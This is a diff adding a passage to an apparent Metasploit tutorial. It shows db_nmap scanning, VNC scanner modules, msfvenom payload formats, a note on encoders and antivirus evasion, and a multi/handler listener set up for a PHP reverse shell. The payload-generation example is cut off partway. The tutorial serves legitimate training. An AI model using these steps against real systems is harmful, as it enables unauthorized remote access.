@@ -20,3 +20,63 @@ notes             List all notes in the database
 services          List all services in the database
 vulns             List all vulnerabilities in the database
 workspace         Switch between database workspaces
+
+
+If you run a Nmap scan using the db_nmap shown below, all results will be saved to the database. 
+
+The db_nmap command
+msf6 > db_nmap -sV -p- 10.10.12.229
+You can now reach information relevant to hosts and services running on target systems with the hosts and services commands, respectively. 
+
+msf6 > use auxiliary/scanner/vnc/
+use auxiliary/scanner/vnc/ard_root_pw    use auxiliary/scanner/vnc/vnc_login      use auxiliary/scanner/vnc/vnc_none_auth
+msf6 > use auxiliary/scanner/vnc/
+
+You can either generate stand-alone payloads (e.g. a Windows executable for Meterpreter) or get a usable raw format (e.g. python). Themsfvenom --list formats command can be used to list supported output formats
+
+Contrary to some beliefs, encoders do not aim to bypass antivirus installed on the target system. As the name suggests, they encode the payload. While it can be effective against some antivirus software, using modern obfuscation techniques or learning methods to inject shellcode is a better solution to the problem. The example below shows the usage of encoding (with the -e parameter. The PHP version of Meterpreter was encoded in Base64, and the output format was raw.
+
+Generating a
+PHP
+
+
+We will use Multi Handler to receive the incoming connection. The module can be used with the use exploit/multi/handler command.
+
+Multi handler supports all Metasploit payloads and can be used for Meterpreter as well as regular shells.
+
+To use the module, we will need to set the payload value (php/reverse_php in this case), the LHOST, and LPORT values.
+
+Setting up the listener
+msf6 > use exploit/multi/handler 
+[*] Using configured payload generic/shell_reverse_tcp
+msf5 exploit(multi/handler) > set payload php/reverse_php
+payload => php/reverse_php
+msf5 exploit(multi/handler) > set lhost 10.0.2.19
+lhost => 10.0.2.19
+msf6 exploit(multi/handler) > set lport 7777
+lport => 7777
+msf6 exploit(multi/handler) > show options
+
+Module options (exploit/multi/handler):
+
+   Name  Current Setting  Required  Description
+   ----  ---------------  --------  -----------
+
+
+Payload options (php/reverse_php):
+
+   Name   Current Setting  Required  Description
+   ----   ---------------  --------  -----------
+   LHOST  10.0.2.19        yes       The listen address (an interface may be specified)
+   LPORT  7777             yes       The listen port
+
+
+Exploit target:
+
+   Id  Name
+   --  ----
+   0   Wildcard Target
+
+
+msf6 exploit(multi/handler) >
+
